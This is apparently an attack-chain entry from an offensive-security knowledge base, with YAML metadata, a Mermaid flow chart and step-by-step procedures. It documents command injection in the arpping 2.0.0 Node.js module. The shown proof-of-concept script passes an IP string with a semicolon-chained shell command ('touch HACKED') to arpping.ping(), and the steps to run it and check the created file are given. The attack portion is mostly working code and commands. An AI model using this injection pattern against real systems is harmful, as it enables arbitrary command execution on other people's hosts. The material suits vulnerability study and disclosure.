---
tags:
  - command-injection
  - rce
  - node-js
  - arpping
type: attack_chain
tools:
  - '[[tools/arpping]]'
  - '[[tools/Node.js]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Node.js
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Install-and-Setup-arpping-POC]]'
  - '[[procedures/Execute-arpping-Command-Injection]]'
step_count: 2
techniques:
  - '[[Command-Line Interface]]'
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:23:23.928Z'
description: >-
  A multi-step attack exploiting command injection in the arpping Node.js module
  to achieve remote code execution by injecting malicious commands into the IP
  parameter of ping and arp functions.
skill_level: intermediate
impact_level: high
id: 7c39f170-7254-4b08-a98e-e11db90f5b60
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
  - '[[Unix Shell]]'
---
# Remote Code Execution via Command Injection in arpping Node.js Module

Multi-stage attack chain demonstrating exploitation of command injection in the arpping Node.js module (version 2.0.0) to execute arbitrary OS commands, leading to remote code execution on the host system.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup POC Script] --> B[Execute Injection]
    B --> C[Command Execution]
    C --> D[System Compromise]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/arpping]]
- [[tools/Node.js]]

### Target Environment

- Node.js runtime environment (version compatible with arpping 2.0.0)
- Unix-like OS (e.g., Linux) for shell command execution
- No specific ports or services required; local execution on host running the vulnerable module

### Initial Access Requirements

- Access to a system where the arpping module can be installed and executed
- No network credentials needed; assumes developer or application context using the module

## Detailed Attack Procedures

### Step 1: Setup POC Script
procedure: [[procedures/Install-and-Setup-arpping-POC]]

**Objective**: Install the vulnerable arpping module and create a proof-of-concept script to prepare for command injection testing.

**Instructions**: Install arpping version 2.0.0 using npm, then require it in a Node.js script and prepare a malicious IP input for injection.

```bash
npm install arpping@2.0.0
```

Create a script (e.g., poc.js) with:

```javascript
const arpping = require('arpping');
arpping.ping(['127.0.0.1;touch HACKED;'], (err, data) => { console.log(data); });
```

**Expected Output**: Module installed without errors; script ready for execution.

**Success Indicators**:
- arpping module listed in node_modules
- POC script file created without syntax errors

### Step 2: Execute Injection for RCE
procedure: [[procedures/Execute-arpping-Command-Injection]]

**Objective**: Run the POC script to trigger command injection, executing arbitrary OS commands via the unsanitized IP parameter.

**Instructions**: Execute the Node.js script, which invokes arpping.ping() with the injected command, leading to shell interpretation and file creation.

```bash
node poc.js
```

Verify execution by checking for the created file:

```bash
ls -la HACKED
```

**Expected Output**: Script runs and creates 'HACKED' file; no errors in console if injection succeeds.

**Success Indicators**:
- 'HACKED' file exists in current directory
- No ping output errors; additional command executed silently

## Attack Chain Summary

### Key Achievements

1. Successful installation of vulnerable arpping module
2. Injection of semicolon-separated command to chain OS execution
3. Demonstration of RCE by creating proof file on host system

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Command-Line Interface]] Command and Scripting Interpreter
- [[Unix Shell]] Unix Shell

### MITRE ATT&CK Tactics

- [[Execution]] Execution

---
*Last updated: 2023-10-01T00:00:00Z*
